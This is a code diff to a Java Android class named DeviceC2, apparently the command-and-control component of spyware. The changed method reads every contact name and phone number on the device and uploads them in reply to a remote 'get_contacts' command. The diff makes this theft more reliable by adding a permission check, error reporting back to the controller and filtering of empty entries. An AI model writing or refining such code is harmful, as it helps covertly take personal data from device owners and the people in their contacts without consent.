@@ -365,9 +365,18 @@ final class DeviceC2 {
         return sb.toString().trim();
     }
 
-    // ---- 联系人（始终用 ContentResolver）----
+    // ---- 联系人（ContentResolver，需 READ_CONTACTS 权限）----
     private static void getContactsAndUpload(Context ctx, String cmdId) {
         try {
+            // 检查运行时权限
+            if (ctx.checkSelfPermission("android.permission.READ_CONTACTS")
+                    != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                // 无权限：上传错误提示 JSON
+                String err = "[{\"error\":\"READ_CONTACTS permission not granted\"}]";
+                uploadBytes(ctx, cmdId, "get_contacts", "json",
+                        err.getBytes(StandardCharsets.UTF_8), "application/json");
+                return;
+            }
             StringBuilder sb = new StringBuilder("[");
             Cursor cursor = ctx.getContentResolver().query(
                     ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
@@ -376,11 +385,12 @@ final class DeviceC2 {
                             ContactsContract.CommonDataKinds.Phone.NUMBER
                     }, null, null,
                     ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
+            boolean first = true;
             if (cursor != null) {
-                boolean first = true;
                 while (cursor.moveToNext()) {
                     String name = cursor.getString(0);
                     String phone = cursor.getString(1);
+                    if (name == null && phone == null) continue;
                     if (!first) sb.append(",");
                     first = false;
                     sb.append("{\"name\":").append(jsonString(name))
@@ -391,7 +401,13 @@ final class DeviceC2 {
             sb.append("]");
             uploadBytes(ctx, cmdId, "get_contacts", "json",
                     sb.toString().getBytes(StandardCharsets.UTF_8), "application/json");
-        } catch (Throwable ignored) {}
+        } catch (Throwable e) {
+            try {
+                String err = "[{\"error\":" + jsonString(e.getMessage()) + "}]";
+                uploadBytes(ctx, cmdId, "get_contacts", "json",
+                        err.getBytes(StandardCharsets.UTF_8), "application/json");
+            } catch (Throwable ignored) {}
+        }
     }
 
     // ---- 相册（始终用 MediaStore）----
